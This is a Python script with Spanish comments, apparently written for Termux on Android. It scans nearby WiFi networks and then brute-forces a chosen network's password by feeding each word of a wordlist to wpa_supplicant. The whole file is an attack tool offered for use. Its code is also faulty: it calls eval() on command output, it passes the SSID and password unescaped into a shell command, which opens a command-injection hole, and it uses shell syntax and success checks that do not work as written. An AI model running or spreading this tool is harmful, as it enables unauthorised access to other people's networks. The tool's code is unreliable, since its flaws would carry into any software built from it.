#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import sys
import os
import platform
import time
import subprocess

RED   = "\033[1;31m"  
BLUE  = "\033[1;34m"
CYAN  = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD    = "\033[;1m"

# Verificar si está en Termux
if "Android" not in platform.system():
    print(RED + "Este script está diseñado para ejecutarse en Termux (Android)." + RESET)
    sys.exit(1)

# Obtener las redes WiFi usando termux-wifi-scaninfo
def listar_redes_wifi():
    try:
        # Ejecutar termux-wifi-scaninfo para listar las redes
        resultado = subprocess.check_output(['termux-wifi-scaninfo'], encoding='utf-8')
        redes = eval(resultado)  # Convertimos la salida a una lista de diccionarios

        for red in redes:
            ssid = red['ssid']
            bssid = red['bssid']
            señal = red['rssi']
            print(f"SSID: {ssid}, Señal: {señal} dBm, BSSID: {bssid}")

        return redes

    except subprocess.CalledProcessError as e:
        print(RED + "Error al ejecutar termux-wifi-scaninfo" + RESET)
        sys.exit(1)

# Intentar conectar a una red WiFi
def conectar_wifi(ssid, password):
    # Usar wpa_supplicant para conectar
    comando = f'wpa_supplicant -i wlan0 -c <(wpa_passphrase "{ssid}" "{password}")'
    try:
        # Ejecutar el comando para intentar conectarse
        subprocess.run(comando, shell=True, check=True)
        print(GREEN + f"[*] Conectado a {ssid} con éxito!" + RESET)
    except subprocess.CalledProcessError:
        print(RED + f"[-] Error al intentar conectar a {ssid}" + RESET)

def main(ssid, password, number):
    print(BLUE + f"[{number}] Intentando conectarse a {ssid} con la contraseña: {password}" + RESET)
    conectar_wifi(ssid, password)

def pwd(ssid, file):
    number = 0
    with open(file, 'r', encoding='utf8') as words:
        for line in words:
            number += 1
            line = line.strip()
            pwd = line
            main(ssid, pwd, number)

def menu():
    parser = argparse.ArgumentParser(description='Herramienta de fuerza bruta WiFi para Termux')

    parser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID = Nombre de la red WiFi')
    parser.add_argument('-w', '--wordlist', metavar='', type=str, help='Lista de contraseñas a probar')

    args = parser.parse_args()

    if args.wordlist and args.ssid:
        ssid = args.ssid
        filee = args.wordlist
    else:
        print(BLUE)
        ssid = input("[*] SSID: ")
        filee = input("[*] Archivo de contraseñas: ")

    # Verificar que el archivo de contraseñas existe
    if os.path.exists(filee):
        print(BLUE + "[~] Iniciando ataque de fuerza bruta..." + RESET)
        pwd(ssid, filee)
    else:
        print(RED + "[-] El archivo de contraseñas no existe." + RESET)

if __name__ == "__main__":
    # Verificar redes disponibles
    listar_redes_wifi()
    menu()
